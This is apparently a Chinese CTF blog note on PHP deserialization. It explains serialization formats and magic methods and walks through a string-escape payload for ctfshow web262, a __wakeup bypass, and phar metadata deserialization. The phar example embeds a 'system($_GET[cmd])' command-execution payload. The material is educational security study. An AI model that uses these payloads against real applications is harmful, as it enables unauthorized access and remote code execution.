---
title: 反序列化漏洞
description: ''
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
abbrlink: fd61bb58
date: 2022-10-15 11:58:08
---



- 序列化: 将类变量(对象)转换为可保存的字符串格式数据
- 反序列化: 将字符串格式的数据转化为类对象

在进行反序列化时,由字符串转化为对象的过程就相当于是创建了一个新对象，并为其相应的属性赋值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些**自动触发的方法(魔术方法)，那么就有可能以此为跳板进而攻击系统应用**。

因此:反序列化漏洞的前提包括:

- 可利用的类,且类中有`__destruct()`这类特殊条件下可以自己调用的魔术方法。
- `unserialize()`函数的参数(字符串)可控

# PHP对象及序列化/反序列化函数

- **`serialize(对象)`,序列化对象或数组,返回字符串**

  ```php
  <?php  //定义一个名为Member的类
      class Member{ 
          public $flag='flag{****}';  //类变量
          public $name='Michael'; 
          public $age='20'; 
          private $team_name = 'baigei';
          protected $team_group = 'caiji';
  
          Public function Run(){ //类方法
              echo $this->name." runnnn<br>";
          }
      } 
      $Person1 = new Member(); //实例化一个对象 
      $Person1->flag='flag{adedyui}'; 
      $Person1->name='lustin'; 
      $Person1->age='18';
      $Person1->Run();
      echo serialize($Person1); 
  ?>
  //输出:
  //lustin runnnn
  //O:6:"Member":5:{s:4:"flag";s:13:"flag{adedyui}";s:4:"name";s:6:"lustin";s:3:"age";s:2:"18";s:17:"Memberteam_name";s:6:"baigei";s:13:"*team_group";s:5:"caiji";}
  ```

  在序列化结果的结构为:

  ```
  O:6:"Member":5 O代表变量类型为对象,6是类名也就是Member的长度,5是这个类中有5个属性
  大括号内当前被序列化的类对象每一个属性的信息:
  s:4:"flag";s:13:"flag{adedyui}";
  第一个s代表属性名称的类型,这里是字符串类型; 4代表属性名的长度,也就是flag的长度; flag是属性名
  第二个s代表属性值的类型,这里是字符串类型; 13代表属性值的长度,也就是flag{adedyui}的长度;flag{adedyui}是属性值
  综上,类对象序列化之后的结构为:
  对象类型:类名长度:类名:属性数:{属性名类型:属性名长度:属性名;属性值类型:属性值长度:属性值;}
  
  注意:
  这里使用privite修饰的类属性变量,在序列化之后会在属性名前面加上类名,也就是Memberteam_name
  使用protected修饰的类属性变量,在序列化之后会在属性名前面加上*,也就变成了*team_group
  
  其他字母及其含义:
  a - array                    b - boolean  
  d - double                   i - integer
  o - common object            r - reference
  s - string                   C - custom object
  O - class                  	 N - null
  R - pointer reference        U - unicode string
  ```

​		

- **`unserialize(字符串)`,反序列化就是序列化的逆过程,输入一个格式符合上边要求的字符串,输出对象(相当于在这个过程中创建了一个对象)**

  例如:

  ```php
  <?php 
      class Member{ 
          public $flag='flag{****}'; 
          public $name='Michael'; 
          public $age='20'; 
          private $team_name = 'baigei';
          protected $team_group = 'caiji';
  
          Public function Run(){
              echo $this->name." runnnn<br>";
          }
      } 
      $Person1 = new Member(); //实例化一个对象 
      $Person1->flag='flag{adedyui}'; 
      $Person1->name='lustin'; 
      $Person1->age='18';
      $Person1->Run();
      $a = serialize($Person1);
      echo $a; 
      echo '<br>';
      var_dump(unserialize($a));
  ?>
  //第21行输出:
  //object(Member)#2 (5) { ["flag"]=> string(13) "flag{adedyui}" ["name"]=> string(6) "lustin" ["age"]=> string(2) "18" ["team_name":"Member":private]=> string(6) "baigei" ["team_group":protected]=> string(5) "caiji" }
  ```

> **这里补充知识点:**
>
> **在序列化`serialize`时, 对于`private`属性,生成字符串中的属性名表现为「类名+属性名」,也就像上面的`Nameusername`**
>
> **但是其实在类名的两侧还各有一个空字节,但是当复制这个字符串并直接执行反序列化的时候,这个空字节并不会被带上,反序列化函数执行时发现格式出现了错误,因此也就导致了反序列化生成对象失败**
>
> **因此这里构建被反序列化的字符串时,需要人工在类名的两端各加上一个`%00`**
>
> 同样的道理, 对于`protected`属性,生成字符串中的属性名表现为「*+属性名」
>
> `*`的两侧同样有两个空字节,因此在反序列化时,也需要在其的两侧个加上一个`%00`



<br>

- 魔术方法:

  类中,在触发了某个特殊条件或事件时自动触发,开头为两个下划线

  | **方法名**         | **作用**                                                     |
  | ------------------ | ------------------------------------------------------------ |
  | **__construct**    | 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值,**unserialize时触发** |
  | **__destruct**     | 和构造函数相反，在对象不再被使用时(被销毁时)(将所有该对象的引用设为null)或者**程序退出时自动调用** |
  | **__toString**     | **当一个对象被当作一个字符串被调用，把类当作字符串使用时触发**，返回值需要为字符串，例如echo打印出对象就会调用此方法 |
  | **__wakeup()**     | **使用unserialize时触发**，反序列化恢复对象之前调用该方法    |
  | **__sleep()**      | **使用serialize时触发** ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化) |
  | **__call()**       | **在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法** |
  | **__callStatic()** | 在静态上下文中调用不可访问的方法时触发                       |
  | **__get()**        | **读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）** |
  | **__set()**        | **在给不可访问属性赋值时，即在调用私有属性的时候会自动执行** |
  | **__isset()**      | 当对不可访问属性调用isset()或empty()时触发                   |
  | **__unset()**      | 当对不可访问属性调用unset()时触发                            |
  | **__invoke()**     | 当脚本尝试将对象调用为函数时触发                             |





# 其他技巧

基本的,直接把题目给的代码中的类和相关属性的代码拿到本地来跑,然后自己根据需要构造一个变量并赋上相应的属性值. 例如:

```php
<?php
class FileHandler {
    public $op=2;
    public $filename="flag.php";
    public $content='';
}
$a = new FileHandler();
$b = serialize($a);
echo $b; 
?>
```

`protected`属性无法在类外对其赋值,那么直接改类内部的代码为其就好了.反正是自己本地的代码

我们需要的是序列化后的字符串, 用其来进行反序列化

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```



有一些版本的php(7.4.3)对修饰符不敏感,因此`protected`属性可以直接改为`public`属性

## 反序列化时的字符串逃逸

一般会对序列化后的字符串进行过滤, 过滤后有两种情形: 字符串变长和变短

参考原题(过滤后字符串变短的)

[[安洵杯 2019]easy_serialize_php](2e610037.html)

**再看一个(ctfshow web262)**

```php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}
highlight_file(__FILE__);


//message.php:
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

简化过来这里的过程就是,`GET`传`f,m,t`, 分别传给`message`类中的`from,msg,to`属性,`message`类中还有一个`token`属性值为`user`,传完参之后并创建`message`类的对象后,会将这个对象序列化, 将序列化字符串中的`fuck`全部替换成`loveU`. 然后再反序列化. 最后如果反序列化后对象的`token`属性为`admin`,则输出flag

本地测试:

```php
<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];
if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $a = serialize($msg);
    $umsg = str_replace('fuck', 'loveU', $a);
    echo $a;
    echo '<br>';
    echo $umsg;
    $b = unserialize($umsg);
    echo '<br>';
    var_dump($b);
}
?>
```

这里`fuck`被替换成`loveU`,每次替换都会使得长度+1. 

先传简单的值看看效果:

```
f=a&m=b&t=c
输出:
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
object(message)#2 (4) { ["from"]=> string(1) "a" ["msg"]=> string(1) "b" ["to"]=> string(1) "c" ["token"]=> string(4) "user" }
```

现在的目标是将最后的`token`属性值改为`admin`,那么就需要在此之前找一个值来提前闭合引号和花括号,如果找`msg`的属性值,也就是上面的`b`来做突破口:

```
f=a&m=";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}&t=c
这里m传的值为:    ";s:2:"to";s:1:"c";s:5:"token";s:5:"token";},其长度为44
输出:
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:44:"";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:44:"";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
object(message)#2 (4) { ["from"]=> string(1) "a" ["msg"]=> string(44) "";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}" ["to"]=> string(1) "c" ["token"]=> string(4) "user" }
```

下一步,利用长度变化,已知每个fuck都会被替换为loveU,使得长度+1:

```
f=a&m=fuckfuck&t=c
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:8:"fuckfuck";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:8:"loveUloveU";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
bool(false)
```

这里过滤后字符串长度为8,而实际长度变成了10

那么如果输入44个fuck,就会使长度增加44,正好抵消了`";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}` 的长度

```
f=a&m=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}&t=c
输出
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:220:"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:220:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
object(message)#2 (4) { ["from"]=> string(1) "a" ["msg"]=> string(220) "loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU" ["to"]=> string(1) "c" ["token"]=> string(5) "admin" }
```

这里, 过滤前的msg的值为44个fuck加上 `";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}`,总长度为220

那么44个fuck被替换成44个loveU之后,总长度也正好是220, 这样反序列化的时候,因为长度对的上,就会认为`msg`的值就是这44个loveU

这样后面的 `";s:2:"to";s:1:"c";s:5:"token";s:5:"token";}`也会在反序列化时被解析为属性和属性值,这样就完成了对原有`token`值得覆盖. 



## `__wake_up`失效

当成员属性数量和实际的属性数量不一致的时候,可以绕过`__wakeup方法`,例如:

```
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

这里属性数量为3,而实际的属性有4个, 这样`__wakeup方法`就不会被调用





<br>

***

<br>

# Phar的反序列化

>`phar`是一种类似于`jar`的打包文件，但是实际上是一种压缩文件，`php5.3`版本或以上都默认开启，可以将多个文件压缩成一个`phar`文件，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>`phar`不需要依赖`unserialize`函数就可以进行反序列化操作，使用`phar`伪协议读取文件会将文件中的`meta-data`数据进行一次反序列化操作。</span>同时php中已经内置了一个phar类用于处理相关的操作

phar的组成部分:

- `stub`文件标识部分, 必须以`__HALT_COMPILER();?>`结尾才能够被识别为`phar`格式的文件, 结尾前面的内容是任意的,例如可以是:

  ```
  xxx\<?php xxx;__HALT_COMPILER();?>
  ```

  

- `manifest describing the contents`,**也就是`meta-data`, 是漏洞的利用点**

>`phar`文件中本质上是一个压缩文件，所以这一部分会放一些压缩文件的一些信息，其中`meta-data`就是以序列化的形式存储在这里
>
>**在使用phar伪协议来读取文件的时候, 就会将这一部分反序列化**, 本意是为了读取文件信息.



- `file contents`, 被压缩的文件内容, 在漏洞利用时这里随便放点什么就行
- 完整性校验签名



虽然在创建PHAR文件时后缀是固定的，但完成创建后我们是可以修改`phar`的后缀名的，例如修改成`.jpg`，当执行`include(‘phar://phar.jpg’);`时也可触发反序列化。

<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>几乎所有对文件进行操作的函数都能触发`phar`反序列化, 只要传给这些文件的参数是`phar://phar.phar `这种形式</span>

也就是说, 我们需要首先在本地构建好用于反序列化的phar文件,然后上传到服务器上, 再通过下面的函数,以`phar://`的形式访问到我们上传的文件

```
fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() file_put_contents() file_get_contents() 
file_exists() fileinode() include() require() include_once require_once() filemtime() fileowner() fileperms() 
filesize() is_dir() scandir() rmdir() highlight_file()
//外加一个类
new DirectoryIteartor() 
```

示例:

```php
 //生成phar文件
<?php
class AnyClass{
    var $output = '';
    function __construct(){
        echo '生成完成...';
    }
}
$object = new AnyClass();   //定义一个对象,我们需要让phar对它进行反序列化
$object -> output= 'system($_GET["cmd"]);';  //往类里面的output变量写入systemxxx

$phar = new Phar('phar.phar');  //被生成的文件，必须是phar做为后缀名
$phar -> startBuffering(); 
$phar -> setStub('<?php __HALT_COMPILER();?>'); //设置phar标志，必须以'__HALT_COMPILER();?>'结尾,其他无所谓
$phar -> addFromString('vfree.txt','vfree');  //要写入的文件和文件内容,这里也随便
$phar -> setMetadata($object);  //将要反序列化的对象写入meta data, 这里是关键
$phar -> stopBuffering();
```

注意,这里生成phar文件需要去`php.ini`中将`phar.readonly`设置为off,否则会报错

![image-20221026195950493](/images/unserialize/image-20221026195950493.png)

例题: [Dropbox](4f3ccb8a.html)





















